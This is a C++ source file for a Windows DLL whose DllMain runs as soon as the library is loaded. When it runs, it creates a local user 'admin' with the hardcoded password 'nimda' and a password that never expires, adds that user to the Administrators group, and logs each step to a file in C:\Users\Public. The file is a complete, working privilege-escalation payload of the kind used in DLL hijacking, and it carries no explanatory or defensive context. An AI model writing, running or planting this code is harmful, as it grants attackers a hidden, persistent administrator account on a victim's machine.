#include <windows.h>
#include <lm.h>
#include <fstream>

#pragma comment(lib, "netapi32.lib")

void LogMessage(const char* message) {
    HANDLE hFile = CreateFileW(L"C:\\Users\\Public\\dll_log.txt",
                               FILE_APPEND_DATA,
                               FILE_SHARE_READ,
                               NULL,
                               OPEN_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, message, (DWORD)strlen(message), &written, NULL);
        CloseHandle(hFile);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        LogMessage("[*] DllMain triggered\n");

        USER_INFO_1 ui;
        LPCWSTR username = L"admin";
        LPCWSTR password = L"nimda";

        ZeroMemory(&ui, sizeof(ui));
        ui.usri1_name = (LPWSTR)username;
        ui.usri1_password = (LPWSTR)password;
        ui.usri1_priv = USER_PRIV_USER;
        ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;

        DWORD dwError = 0;
        NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
        if (status == NERR_Success) {
            LogMessage("[+] User 'admin' created successfully\n");

            LOCALGROUP_MEMBERS_INFO_3 group;
            group.lgrmi3_domainandname = (LPWSTR)username;
            status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&group, 1);

            if (status == NERR_Success) {
                LogMessage("[+] User 'admin' added to Administrators group\n");
            } else {
                LogMessage("[-] Failed to add user to Administrators group\n");
            }
        } else {
            LogMessage("[-] Failed to create user\n");
        }
    }

    return TRUE;
}
